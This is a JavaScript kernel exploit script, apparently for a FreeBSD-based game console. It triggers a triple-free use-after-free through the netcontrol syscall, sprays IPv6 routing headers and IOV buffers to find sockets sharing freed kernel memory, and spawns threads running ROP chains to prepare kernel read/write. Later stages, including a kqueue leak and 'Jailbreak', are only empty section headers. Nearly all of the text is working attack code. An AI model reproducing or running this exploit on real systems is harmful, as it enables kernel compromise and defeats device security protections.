include('userland.js')

// Register syscalls
fn.register(0x61, 'socket', 'bigint')
fn.register(0x87, 'socketpair', 'bigint')
fn.register(0x69, 'setsockopt', 'bigint')
fn.register(0x76, 'getsockopt', 'bigint')
fn.register(0x06, 'close', 'bigint')
fn.register(0x29, 'dup', 'bigint')
fn.register(0x1B, 'recvmsg', 'bigint')
fn.register(0x03, 'read', 'bigint')
fn.register(0x04, 'write', 'bigint')
fn.register(0x17, 'setuid', 'bigint')
fn.register(0x14B, 'sched_yield', 'bigint')
fn.register(0x63, 'netcontrol', 'bigint')
fn.register(0x1C7, 'thr_new', 'bigint')

var socket = fn.socket
var socketpair = fn.socketpair
var setsockopt = fn.setsockopt
var getsockopt = fn.getsockopt
var close = fn.close
var dup = fn.dup
var recvmsg = fn.recvmsg
var read = fn.read
var write = fn.write
var setuid = fn.setuid
var sched_yield = fn.sched_yield
var netcontrol = fn.netcontrol
var thr_new = fn.thr_new

log('Syscalls registered')

// Get syscall wrappers for ROP chains (gadgets object already initialized globally)
var read_wrapper = syscalls.map.get(0x03)
var write_wrapper = syscalls.map.get(0x04)
var recvmsg_wrapper = syscalls.map.get(0x1B)
var sched_yield_wrapper = syscalls.map.get(0x14B)

// Optional syscall wrappers
var cpuset_setaffinity_wrapper = null
if (syscalls.map.has(0x1E4)) {
  cpuset_setaffinity_wrapper = syscalls.map.get(0x1E4)
  log('cpuset_setaffinity available')
}

var rtprio_thread_wrapper = null
if (syscalls.map.has(0x1D2)) {
  rtprio_thread_wrapper = syscalls.map.get(0x1D2)
  log('rtprio_thread available')
}

// Constants
var AF_UNIX = 1
var AF_INET6 = 28
var SOCK_STREAM = 1
var IPPROTO_IPV6 = 41

var IPV6_RTHDR = 51
var IPV6_RTHDR_TYPE_0 = 0
var UCRED_SIZE = 0x168
var MSG_HDR_SIZE = 0x30
var UIO_IOV_NUM = 0x14
var MSG_IOV_NUM = 0x17
var IOV_SIZE = 0x10

var IPV6_SOCK_NUM = 128
var TWIN_TRIES = 10 //<--------------------------------TWINS
var UAF_TRIES = 500 //<--------------------------------TRIPLET TIMEOUT
var KQUEUE_TRIES = 300000
var IOV_THREAD_NUM = 4
var UIO_THREAD_NUM = 4
var PIPEBUF_SIZE = 0x18
var IOV_WORKER_NUM = 4

// Worker thread stack sizes
var WORKER_STACK_SIZE = 0x400000
var WORKER_ROP_STACK_SIZE = 0x10000

var COMMAND_UIO_READ = 0
var COMMAND_UIO_WRITE = 1
var PAGE_SIZE = 0x4000
var FILEDESCENT_SIZE = 0x8

var UIO_READ = 0
var UIO_WRITE = 1
var UIO_SYSSPACE = 1

var NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003
var NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007
var RTHDR_TAG = 0x13370000

var SOL_SOCKET = 0xffff
var SO_SNDBUF = 0x1001

var F_SETFL = 4
var O_NONBLOCK = 4

// Global exploit data
var leakRthdr = mem.malloc(UCRED_SIZE)
var leakRthdrLen = mem.malloc(4)
var sprayRthdr = mem.malloc(UCRED_SIZE)
var msg = mem.malloc(MSG_HDR_SIZE)
var msgIov = mem.malloc(MSG_IOV_NUM * IOV_SIZE)
var tmp = mem.malloc(PAGE_SIZE)
var uioIovRead = mem.malloc(UIO_IOV_NUM * IOV_SIZE)
var uioIovWrite = mem.malloc(UIO_IOV_NUM * IOV_SIZE)

var uioSs = mem.malloc(8)
var iovSs = mem.malloc(8)

var uafSock = -1
var uioSs0 = -1
var uioSs1 = -1
var iovSs0 = -1
var iovSs1 = -1

var ipv6Socks = []
var twins = [-1, -1]
var triplets = [-1, -1, -1]
var sprayRthdrLen = 0
var workers = []

log('Constants initialized')

// Helper functions - getRthdr/setRthdr/freeRthdr
function getRthdr(sock, buf, len) {
  getsockopt(sock, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
}

function setRthdr(sock, buf, len) {
  setsockopt(sock, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
}

function freeRthdr(sock) {
  setsockopt(sock, IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
}

// buildRthdr - creates routing header buffer
function buildRthdr(buf, size) {
  var len = ((size >> 3) - 1) & ~1
  mem.view(buf).setUint8(0x00, 0, true)          // ip6r_nxt
  mem.view(buf).setUint8(0x01, len, true)        // ip6r_len
  mem.view(buf).setUint8(0x02, IPV6_RTHDR_TYPE_0, true)  // ip6r_type
  mem.view(buf).setUint8(0x03, len >> 1, true)   // ip6r_segleft
  return (len + 1) << 3
}

// findTwins - searches for twin sockets sharing same pktopts
function findTwins(timeout) {
  while (timeout-- > 0) {
    for (var i = 0; i < IPV6_SOCK_NUM; i++) {
      mem.view(sprayRthdr).setUint32(0x04, RTHDR_TAG | i, true)
      setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen)
    }

    for (var i = 0; i < IPV6_SOCK_NUM; i++) {
      mem.view(leakRthdrLen).setUint32(0, 8, true)
      getRthdr(ipv6Socks[i], leakRthdr, leakRthdrLen)
      var val = mem.view(leakRthdr).getUint32(0x04, true)
      var j = val & 0xFFFF
      if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
        twins[0] = i
        twins[1] = j
        return true
      }
    }
  }
  return false
}

// findTriplet - finds third socket sharing pktopts with master
function findTriplet(master, other, timeout) {
  var originalTimeout = timeout
  while (timeout-- > 0) {
    for (var i = 0; i < IPV6_SOCK_NUM; i++) {
      if (i === master || i === other) {
        continue
      }
      mem.view(sprayRthdr).setUint32(0x04, RTHDR_TAG | i, true)
      setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen)
    }

    for (var i = 0; i < IPV6_SOCK_NUM; i++) {
      if (i === master || i === other) {
        continue
      }
      mem.view(leakRthdrLen).setUint32(0, 8, true)
      getRthdr(ipv6Socks[master], leakRthdr, leakRthdrLen)
      var val = mem.view(leakRthdr).getUint32(0x04, true)
      var j = val & 0xFFFF
      if ((val & 0xFFFF0000) === RTHDR_TAG && j !== master && j !== other) {
        return j
      }
    }

    if ((originalTimeout - timeout) % 5000 === 0) {
      log('  triplet search: ' + (originalTimeout - timeout) + ' attempts')
    }
  }
  return -1
}

log('Helper functions defined')

// Build ROP chain for IOV worker: infinite loop with stack pivoting
function buildWorkerROP(worker) {
  var rop_chain = []

  // Pin to CPU 4 (if available)
  if (cpuset_setaffinity_wrapper !== null) {
    rop_chain.push(gadgets.POP_RDI_RET)
    rop_chain.push(new BigInt(0, 3))
    rop_chain.push(gadgets.POP_RSI_RET)
    rop_chain.push(new BigInt(0, 1))
    rop_chain.push(gadgets.POP_RDX_RET)
    rop_chain.push(new BigInt(0xffffffff, 0xffffffff))
    rop_chain.push(gadgets.POP_RCX_RET)
    rop_chain.push(new BigInt(0, 0x10))
    rop_chain.push(gadgets.POP_R8_RET)
    rop_chain.push(worker.cpumask)
    rop_chain.push(cpuset_setaffinity_wrapper)
  }

  // Set realtime priority (if available)
  if (rtprio_thread_wrapper !== null) {
    rop_chain.push(gadgets.POP_RDI_RET)
    rop_chain.push(new BigInt(0, 1))
    rop_chain.push(gadgets.POP_RSI_RET)
    rop_chain.push(new BigInt(0, 0))
    rop_chain.push(gadgets.POP_RDX_RET)
    rop_chain.push(worker.rtp)
    rop_chain.push(rtprio_thread_wrapper)
  }

  // Calculate loop start address (after setup gadgets only)
  var rop_stack_top = worker.rop_stack.add(new BigInt(0, worker.rop_stack_size))
  var setup_gadgets = 0
  if (cpuset_setaffinity_wrapper !== null) setup_gadgets += 10
  if (rtprio_thread_wrapper !== null) setup_gadgets += 7
  var loop_start_offset = setup_gadgets * 8
  var loop_start_rsp = rop_stack_top.sub(new BigInt(0, loop_start_offset))

  // LOOP START - wait for signal, do spray, loop back
  // Wait for signal: read(ctrl_sock0, buf, 1)
  rop_chain.push(gadgets.POP_RDI_RET)
  rop_chain.push(new BigInt(worker.ctrl_sock0))
  rop_chain.push(gadgets.POP_RSI_RET)
  rop_chain.push(worker.signal_buf)
  rop_chain.push(gadgets.POP_RDX_RET)
  rop_chain.push(new BigInt(0, 1))
  rop_chain.push(read_wrapper)

  // Write 1 byte to iovSs1 so recvmsg has data to read
  rop_chain.push(gadgets.POP_RDI_RET)
  rop_chain.push(new BigInt(iovSs1))
  rop_chain.push(gadgets.POP_RSI_RET)
  rop_chain.push(worker.signal_buf)
  rop_chain.push(gadgets.POP_RDX_RET)
  rop_chain.push(new BigInt(0, 1))
  rop_chain.push(write_wrapper)

  // Do work: recvmsg(iovSs0, worker.corrupt_msg_hdr, 0)
  // Allocates IOV, blocks until data ready, then fails with EFAULT
  rop_chain.push(gadgets.POP_RDI_RET)
  rop_chain.push(new BigInt(iovSs0))
  rop_chain.push(gadgets.POP_RSI_RET)
  rop_chain.push(worker.corrupt_msg_hdr)
  rop_chain.push(gadgets.POP_RDX_RET)
  rop_chain.push(new BigInt(0, 0))
  rop_chain.push(recvmsg_wrapper)

  // Read back the byte
  rop_chain.push(gadgets.POP_RDI_RET)
  rop_chain.push(new BigInt(iovSs0))
  rop_chain.push(gadgets.POP_RSI_RET)
  rop_chain.push(worker.signal_buf)
  rop_chain.push(gadgets.POP_RDX_RET)
  rop_chain.push(new BigInt(0, 1))
  rop_chain.push(read_wrapper)

  // Signal work done: write(ctrl_sock0, buf, 1)
  rop_chain.push(gadgets.POP_RDI_RET)
  rop_chain.push(new BigInt(worker.ctrl_sock0))
  rop_chain.push(gadgets.POP_RSI_RET)
  rop_chain.push(worker.signal_buf)
  rop_chain.push(gadgets.POP_RDX_RET)
  rop_chain.push(new BigInt(0, 1))
  rop_chain.push(write_wrapper)

  // Pivot RSP back to loop start
  rop_chain.push(gadgets.POP_RSP_RET)
  rop_chain.push(loop_start_rsp)

  return rop_chain
}

// Spawn a worker thread
function spawnWorker(worker_idx) {
  var worker = workers[worker_idx]

  // Reset TID values
  mem.view(worker.child_tid).setBigInt(0, new BigInt(0, 0), true)
  mem.view(worker.parent_tid).setBigInt(0, new BigInt(0, 0), true)

  // Build and write ROP chain to dedicated ROP stack
  var rop_chain = buildWorkerROP(worker)
  var rop_stack_top = worker.rop_stack.add(new BigInt(0, worker.rop_stack_size))
  for (var i = rop_chain.length - 1; i >= 0; i--) {
    rop_stack_top = rop_stack_top.sub(new BigInt(0, 8))
    mem.view(rop_stack_top).setBigInt(0, rop_chain[i], true)
  }

  // Write pivot target to thread's initial stack
  var initial_stack_top = worker.stack.add(new BigInt(0, worker.stack_size))
  var pivot_stack = initial_stack_top.sub(new BigInt(0, 8))
  mem.view(pivot_stack).setBigInt(0, rop_stack_top, true)

  // Setup thr_param
  mem.view(worker.thr_param).setBigInt(0x00, gadgets.POP_RSP_RET, true)
  mem.view(worker.thr_param).setBigInt(0x08, new BigInt(0, 0), true)
  mem.view(worker.thr_param).setBigInt(0x10, worker.stack, true)
  mem.view(worker.thr_param).setBigInt(0x18, new BigInt(0, worker.stack_size), true)
  mem.view(worker.thr_param).setBigInt(0x20, worker.tls, true)
  mem.view(worker.thr_param).setBigInt(0x28, new BigInt(0, 0x40), true)
  mem.view(worker.thr_param).setBigInt(0x30, worker.child_tid, true)
  mem.view(worker.thr_param).setBigInt(0x38, worker.parent_tid, true)

  return thr_new(worker.thr_param, new BigInt(0, 0x68))
}

// Initialize exploit
function initExploit() {
  log('Initializing exploit...')

  // Create IPv6 sockets
  log('Creating ' + IPV6_SOCK_NUM + ' IPv6 sockets...')
  for (var i = 0; i < IPV6_SOCK_NUM; i++) {
    var fd = socket(AF_INET6, SOCK_STREAM, 0)
    ipv6Socks[i] = (fd instanceof BigInt) ? fd.lo : fd
  }
  log('IPv6 sockets created')

  // Create IOV socketpair
  socketpair(AF_UNIX, SOCK_STREAM, 0, iovSs)
  iovSs0 = mem.view(iovSs).getUint32(0, true)
  iovSs1 = mem.view(iovSs).getUint32(4, true)
  log('IOV socketpair: [' + iovSs0 + ', ' + iovSs1 + ']')

  // Build spray routing header
  sprayRthdrLen = buildRthdr(sprayRthdr, UCRED_SIZE)
  log('Spray rthdr size: ' + sprayRthdrLen)

  // Build IOV message header
  mem.view(msgIov).setBigInt(0, new BigInt(0x1), true)
  mem.view(msgIov).setBigInt(8, new BigInt(0x1), true)

  mem.view(msg).setBigInt(0x00, new BigInt(0), true)
  mem.view(msg).setUint32(0x08, 0, true)
  mem.view(msg).setBigInt(0x10, msgIov, true)
  mem.view(msg).setBigInt(0x18, new BigInt(MSG_IOV_NUM), true)
  mem.view(msg).setBigInt(0x20, new BigInt(0), true)
  mem.view(msg).setUint32(0x28, 0, true)
  mem.view(msg).setUint32(0x2C, 0, true)

  log('Exploit initialized')
  return sprayRthdrLen
}

log('Initialization function ready')

// Main exploit function
function runExploit() {
  log('Starting exploit...')

  // Trigger triple-free UAF
  var setBuf = mem.malloc(8)
  var clearBuf = mem.malloc(8)

  // Create dummy socket for netcontrol
  var dummySock = socket(AF_UNIX, SOCK_STREAM, 0)
  dummySock = (dummySock instanceof BigInt) ? dummySock.lo : dummySock
  log('dummy socket: ' + dummySock)

  mem.view(setBuf).setUint32(0, dummySock, true)
  try {
        netcontrol(new BigInt(0xFFFFFFFF, 0xFFFFFFFF), new BigInt(NET_CONTROL_NETEVENT_SET_QUEUE), setBuf, new BigInt(8))
    } catch(e) { 
        utils.notify("Fail: Reboot and try again!") 
        jsmaf.root.children.push(bg_fail);
    }
  close(dummySock)
  setuid(1)

  // Create UAF socket
  uafSock = socket(AF_UNIX, SOCK_STREAM, 0)
  uafSock = (uafSock instanceof BigInt) ? uafSock.lo : uafSock
  log('uaf socket: ' + uafSock)

  setuid(1)

  mem.view(clearBuf).setUint32(0, uafSock, true)
  try {
  netcontrol(new BigInt(0xFFFFFFFF, 0xFFFFFFFF), new BigInt(NET_CONTROL_NETEVENT_CLEAR_QUEUE), clearBuf, new BigInt(8))
    } catch(e) {
        utils.notify("Fail: Reboot and try again!") 
       jsmaf.root.children.push(bg_fail);
     }
  // Reset cr_refcnt with IOV sprays
  log('resetting cr_refcnt with 32 IOV sprays...')
  for (var i = 0; i < 32; i++) {
    // Write to wake recvmsg
    write(iovSs1, tmp, new BigInt(1))

    // recvmsg will fail with EFAULT because iov_base=1 is invalid
    // But kernel already allocated IOV array - that's the spray!
    try {
      recvmsg(iovSs0, msg, 0)
    } catch (e) {
      // Expected error - IOV was allocated then freed
    }

    // Read back byte
    read(iovSs0, tmp, new BigInt(1))
  }

  // Trigger double-free
  log('triggering double-free...')
  var dupFd = dup(uafSock)
  dupFd = (dupFd instanceof BigInt) ? dupFd.lo : dupFd
  close(dupFd)

  // Find twins (retry up to 10 times)
  log('searching for twins...')
  var twinAttempts = 0
  var maxTwinAttempts = 10
  var foundTwins = false

  while (twinAttempts < maxTwinAttempts && !foundTwins) {
    twinAttempts++
    log('twin search attempt ' + twinAttempts + ' / ' + maxTwinAttempts)

    if (findTwins(TWIN_TRIES)) {
      foundTwins = true
      log('twins found: [' + twins[0] + ', ' + twins[1] + ']')
      break
    }

    if (!foundTwins && twinAttempts < maxTwinAttempts) {
      log('twins not found, retrying exploit...')
      // Return false to trigger restart
      return false
    }
  }

  if (!foundTwins) {
    throw new Error('Failed to find twins after ' + maxTwinAttempts + ' attempts!')
  }

  // Free one twin's rthdr
  freeRthdr(ipv6Socks[twins[1]])

  // IOV reclaim
  log('attempting IOV reclaim...')
  var timeout = UAF_TRIES
  var reclaimed = false
  while (timeout-- > 0) {
    // Write to trigger recvmsg
    write(iovSs1, tmp, new BigInt(1))

    // Do recvmsg to allocate IOV (will fail with EFAULT but IOV is allocated)
    try {
      recvmsg(iovSs0, msg, 0)
    } catch (e) {
      // Expected - IOV allocated then freed
    }

    // Check if reclaimed while IOV was allocated
    mem.view(leakRthdrLen).setUint32(0, 8, true)
    getRthdr(ipv6Socks[twins[0]], leakRthdr, leakRthdrLen)

    if (mem.view(leakRthdr).getUint32(0, true) === 1) {
      log('IOV reclaim success after ' + (UAF_TRIES - timeout) + ' attempts!')
      reclaimed = true
      // Read back the byte we wrote to clean up socket state
      read(iovSs0, tmp, new BigInt(1))
      break
    }

    // Read back the byte to complete the cycle
    read(iovSs0, tmp, new BigInt(1))

    if ((UAF_TRIES - timeout) % 1000 === 0) {
      log('  attempt ' + (UAF_TRIES - timeout))
    }
  }

  if (!reclaimed) {
    throw new Error('IOV reclaim failed after ' + UAF_TRIES + ' attempts!')
  }

  // Create IOV workers now that reclaim succeeded
  log('Creating ' + IOV_WORKER_NUM + ' IOV worker structures...')
  for (var w = 0; w < IOV_WORKER_NUM; w++) {
    var worker = {}

    // Allocate stacks
    worker.stack_size = WORKER_STACK_SIZE
    worker.stack = mem.malloc(worker.stack_size)
    worker.rop_stack_size = WORKER_ROP_STACK_SIZE
    worker.rop_stack = mem.malloc(worker.rop_stack_size)

    // Allocate TLS
    worker.tls = mem.malloc(0x40)

    // Allocate thr_param
    worker.thr_param = mem.malloc(0x68)

    // Allocate TID pointers
    worker.child_tid = mem.malloc(8)
    worker.parent_tid = mem.malloc(8)

    // Create control socketpair
    var ctrl_ss = mem.malloc(8)
    socketpair(AF_UNIX, SOCK_STREAM, 0, ctrl_ss)
    worker.ctrl_sock0 = mem.view(ctrl_ss).getUint32(0, true)
    worker.ctrl_sock1 = mem.view(ctrl_ss).getUint32(4, true)

    // Allocate signal buffer
    worker.signal_buf = mem.malloc(8)

    // Allocate corrupt msg_hdr for recvmsg
    worker.corrupt_msg_hdr = mem.malloc(MSG_HDR_SIZE)
    var worker_msgIov = mem.malloc(MSG_IOV_NUM * IOV_SIZE)
    mem.view(worker_msgIov).setBigInt(0, new BigInt(0x1), true)
    mem.view(worker_msgIov).setBigInt(8, new BigInt(0x1), true)
    mem.view(worker.corrupt_msg_hdr).setBigInt(0x00, new BigInt(0), true)
    mem.view(worker.corrupt_msg_hdr).setUint32(0x08, 0, true)
    mem.view(worker.corrupt_msg_hdr).setBigInt(0x10, worker_msgIov, true)
    mem.view(worker.corrupt_msg_hdr).setBigInt(0x18, new BigInt(MSG_IOV_NUM), true)
    mem.view(worker.corrupt_msg_hdr).setBigInt(0x20, new BigInt(0), true)
    mem.view(worker.corrupt_msg_hdr).setUint32(0x28, 0, true)
    mem.view(worker.corrupt_msg_hdr).setUint32(0x2C, 0, true)

    // Allocate cpumask and rtp for optional syscalls
    worker.cpumask = mem.malloc(0x10)
    mem.view(worker.cpumask).setBigInt(0, new BigInt(0x10, 0), true)

    worker.rtp = mem.malloc(0x10)
    mem.view(worker.rtp).setUint16(0, 0, true)  // type
    mem.view(worker.rtp).setUint16(2, 256, true)  // prio

    workers.push(worker)
  }
  log('Created ' + IOV_WORKER_NUM + ' IOV worker structures')

  // Spawn IOV workers to continuously spray IOVs during triplet search
  log('Spawning ' + IOV_WORKER_NUM + ' IOV workers...')
  for (var w = 0; w < IOV_WORKER_NUM; w++) {
    var ret = spawnWorker(w)
    if (!ret.eq(0)) {
      throw new Error('Failed to spawn IOV worker ' + w + ': ' + ret.toString())
    }
  }
  log('All IOV workers spawned')

  // Give workers time to reach their blocking read
  sched_yield()
  sched_yield()
  sched_yield()

  // Find triplets (workers spray in background)
  triplets[0] = twins[0]

  close(dup(uafSock))

  log('finding triplet[1]...')
  var tries1 = UAF_TRIES
  triplets[1] = -1
  while (tries1-- > 0) {
    // Signal all workers to do one spray
    for (var w = 0; w < IOV_WORKER_NUM; w++) {
      write(workers[w].ctrl_sock1, workers[w].signal_buf, new BigInt(1))
    }

    // Wait for all workers to finish spray
    for (var w = 0; w < IOV_WORKER_NUM; w++) {
      read(workers[w].ctrl_sock1, workers[w].signal_buf, new BigInt(1))
    }

    triplets[1] = findTriplet(triplets[0], -1, 100)
    if (triplets[1] !== -1) {
      log('triplet[1]: ' + triplets[1])
      break
    }

    // Log progress every 100 iterations
    if ((UAF_TRIES - tries1) % 100 === 0) {
      log('  triplet[1] search: ' + (UAF_TRIES - tries1) + ' spray iterations')
    }
  }
  if (triplets[1] === -1) {
    throw new Error('Failed to find triplet[1]!')
  }

  log('finding triplet[2]...')
  var tries2 = UAF_TRIES
  triplets[2] = -1
  var iteration = 0
  while (tries2-- > 0) {
    iteration++
    if (iteration % 10 === 0) {
      log('  iteration ' + iteration)
    }

    // Signal all workers to start spraying
    for (var w = 0; w < IOV_WORKER_NUM; w++) {
      write(workers[w].ctrl_sock1, workers[w].signal_buf, new BigInt(1))
    }

    // Search WHILE workers are spraying (this is the fix!)
    triplets[2] = findTriplet(triplets[0], triplets[1], 100)

    if (triplets[2] !== -1) {
      log('triplet[2]: ' + triplets[2] + ' (found after ' + iteration + ' attempts)')
      // Found it! Now wait for workers to finish
      for (var w = 0; w < IOV_WORKER_NUM; w++) {
        read(workers[w].ctrl_sock1, workers[w].signal_buf, new BigInt(1))
      }
      break
    }

    // Not found, wait for workers to finish this cycle before retrying
    for (var w = 0; w < IOV_WORKER_NUM; w++) {
      read(workers[w].ctrl_sock1, workers[w].signal_buf, new BigInt(1))
    }

    // Log progress every 100 iterations
    if ((UAF_TRIES - tries2) % 100 === 0) {
      log('  triplet[2] search: ' + (UAF_TRIES - tries2) + ' spray iterations')
    }
  }
  if (triplets[2] === -1) {
    throw new Error('Failed to find triplet[2]!')
  }

  log('Triplets FOUND! Triplets: [' + triplets[0] + ', ' + triplets[1] + ', ' + triplets[2] + ']')
  log('Ready for kernel read/write')
  return true
}

// Run initialization
initExploit()

// Run exploit with retry
log('-------- Starting Exploit --------')
var maxExploitRetries = 100
var exploitAttempt = 0
var success = false

while (exploitAttempt < maxExploitRetries && !success) {
  exploitAttempt++
  log('=== Exploit attempt ' + exploitAttempt + ' ===')

  try {
    var result = runExploit()
    if (result === true) {
      success = true
      log('SUCCESS')
      break
    } else {
      log('Exploit returned false, retrying...')
    }
  } catch (e) {
    log('Exploit failed: ' + e.message)
    if (exploitAttempt >= maxExploitRetries) {
      throw e
    }
  }
}

if (!success) {
  throw new Error('Exploit failed after ' + maxExploitRetries + ' attempts')
}

// ============================================================================
// STAGE 4: Leak kqueue structure
// ============================================================================

// ============================================================================
// STAGE 5: Kernel R/W primitives via pipe corruption
// ============================================================================

// ============================================================================
// STAGE 6: Jailbreak
// ============================================================================
